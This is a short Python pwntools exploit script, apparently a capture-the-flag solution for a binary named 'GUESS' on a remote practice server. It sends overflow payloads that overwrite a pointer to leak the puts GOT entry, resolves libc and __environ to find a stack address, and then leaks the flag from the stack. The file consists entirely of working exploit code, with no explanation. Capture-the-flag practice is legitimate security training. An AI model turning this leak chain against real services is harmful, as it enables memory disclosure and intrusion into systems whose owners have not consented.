#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/05/25 16:11:04
@Author  :   eur1ka  
@Version :   2.7
@Contact :   raogx.vip@hotmail.com
@License :   (C)Copyright 2017-2018, Liugroup-NLPR-CASIA
@Desc    :   None
'''

# here put the import lib

from pwn import *
from LibcSearcher import *
import pwnlib
context.log_level = 'debug'
debug = 0
if debug:
    sh = process('GUESS')
else:
    sh = remote('node3.buuoj.cn',25015)
elf = ELF('GUESS')
# libc = ELF()
payload = 'a' * 0x128 + p64(elf.got['puts'])
sh.sendline(payload)
puts_addr = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
log.info("Success leak puts_addr:0x%x"%puts_addr)
libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
environ = libc_base + libc.dump('__environ')
payload = 'a' * 0x128 + p64(environ)
sh.sendline(payload)
stack_addr = u64(sh.recvuntil('\x7f')[-6:].ljust(8,'\x00'))

flag_addr = stack_addr - 0x168
payload = 'a' * 0x128 + p64(flag_addr)
sh.sendline(payload)
sh.interactive()